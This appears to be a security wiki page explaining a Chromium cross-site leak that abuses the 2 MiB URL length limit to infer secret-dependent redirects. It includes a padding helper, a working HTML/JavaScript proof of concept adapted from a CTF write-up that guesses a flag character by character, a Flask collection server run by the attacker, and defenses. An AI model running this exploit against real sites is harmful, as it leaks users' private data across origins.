# URL Max Length - Client Side

{{#include ../../banners/hacktricks-training.md}}

This Chromium-specific XS-Leak exploits the browser's 2 MiB URL limit. The attacker opens a URL just below the limit. If a secret-dependent response redirects to a longer URL, Chromium blocks the navigation and leaves an accessible `about:blank` document; otherwise, the window completes a cross-origin navigation and reading `origin` throws an exception. This difference provides a one-bit oracle.<sup>[[1]](#references)[[2]](#references)</sup>

## Requirements and mechanics

The useful gadget is a **credentialed top-level GET** whose hit and miss paths produce final URLs of different lengths. This matters because `SameSite=Lax` cookies can accompany a top-level navigation even though they would normally be absent from a cross-site subresource probe. The attacker must also retain the popup's `WindowProxy`, and the ordinary branch must commit a document cross-origin from the attacker.<sup>[[1]](#references)</sup>

The padding belongs in the **fragment**. It is not sent in the HTTP request, so the initial request does not have to cross a server or proxy request-line limit. When an HTTP redirect has no fragment of its own, the browser carries the original fragment into the redirect target; any state-dependent path/query growth can therefore push only the final client-side URL over the limit. A `Location` containing its own fragment replaces this padding and breaks the primitive.<sup>[[1]](#references)</sup>

Current Chromium keeps `kMaxURLChars` at `2 * 1024 * 1024` (2,097,152) and rejects a navigation when the canonical destination's `spec().size()` is greater than that value. Count the **serialized URL**, not an unescaped input string: percent-encoding and URL canonicalization can change its size. Using an ASCII fragment makes the calculation predictable.<sup>[[2]](#references)[[3]](#references)</sup>

```javascript
function padBelowLimit(base, slack = 1) {
  const u = new URL(base)
  u.hash = ""
  const head = u.href + "#"
  const count = 2 * 1024 * 1024 - head.length - slack
  if (count < 0) throw new Error("base URL already exceeds the limit")
  return head + "A".repeat(count)
}
```

Choose `slack` smaller than the redirect-induced growth, and calibrate the boundary with known hit/miss queries in the exact browser build. Do not assume that every oversized navigation exposes the same state: current Chromium regression tests map an oversized fragment from an initial `about:blank` document to `about:blank#blocked`, while an oversized same-document fragment navigation from an already committed non-blank page can retain its previous URL. The fresh popup/initial-document state is therefore part of the gadget.<sup>[[3]](#references)[[4]](#references)</sup>

## Proof of concept

The following proof of concept, adapted from the HackTM CTF 2023 write-up, tests candidate characters:<sup>[[1]](#references)</sup>

```html
<html>
  <body></body>
  <script>
    ;(async () => {
      const curr = "http://secrets.wtl.pw/search?query=HackTM{"

      const leak = async (char) => {
        fetch("/?try=" + char)
        let w = window.open(
          curr + char + "#" + "A".repeat(2 * 1024 * 1024 - curr.length - 2)
        )

        const check = async () => {
          try {
            w.origin
          } catch {
            fetch("/?nope=" + char)
            return
          }
          setTimeout(check, 100)
        }
        check()
      }

      const CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"

      for (let i = 0; i < CHARSET.length; i++) {
        leak(CHARSET[i])
        await new Promise((resolve) => setTimeout(resolve, 50))
      }
    })()
  </script>
</html>
```

The attacker's server records candidates for which the cross-origin navigation completed:

```python
from flask import Flask, request

app = Flask(__name__)

CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"
chars = []

@app.route('/', methods=['GET'])
def index():
    global chars

    nope = request.args.get('nope', '')
    if nope:
        chars.append(nope)

    remaining = [c for c in CHARSET if c not in chars]

    print("Remaining: {}".format(remaining))

    return "OK"

@app.route('/exploit.html', methods=['GET'])
def exploit():
    return open('exploit.html', 'r').read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

This PoC is an **elimination oracle**: a `SecurityError` means the popup committed cross-origin, so that candidate is reported as `nope`; candidates that remain readable are possible hits. The initial popup is also readable before its navigation commits, so never classify the first successful read as a hit. Use a bounded polling deadline, reject `window.open()` returning `null`, close each popup, keep concurrency low, and confirm survivors over several runs with known positive and negative controls. Otherwise slow navigation, popup blocking, or the memory cost of multiple 2 MiB URLs can create false positives and destabilize a browser bot.<sup>[[1]](#references)</sup>

## Limitations and defenses

This is not a generic URL-length oracle: it requires a length-changing redirect, inherited fragment padding, a usable top-level popup, and Chromium behavior that preserves a same-origin initial document on the oversized branch. Firefox, WebKit, embedded WebViews, and future Chromium versions must be measured independently rather than assigned the same threshold or blocked-page behavior.<sup>[[1]](#references)[[4]](#references)</sup>

The strongest fix is to remove the state-dependent navigation difference: do not place secret-dependent data in redirect destinations and make hit/miss redirects indistinguishable in structure and length.<sup>[[1]](#references)</sup> See the general [XS-Leaks defenses](README.md#defenses) for controls that restrict credentialed cross-site requests or sever opener relationships.



## References

- [1] [HackTM CTF Quals 2023 - secrets (unintended solution: Chrome's 2MB URL limit)](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- [2] [Chromium - URL display guidelines: URL length](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length)
- [3] [Chromium - navigation URL validation (`kMaxURLChars`)](https://chromium.googlesource.com/chromium/src/+/main/content/browser/renderer_host/navigation_controller_impl.cc)
- [4] [Chromium - oversized navigation browser tests](https://chromium.googlesource.com/chromium/src/+/main/content/browser/navigation_browsertest.cc)
{{#include ../../banners/hacktricks-training.md}}
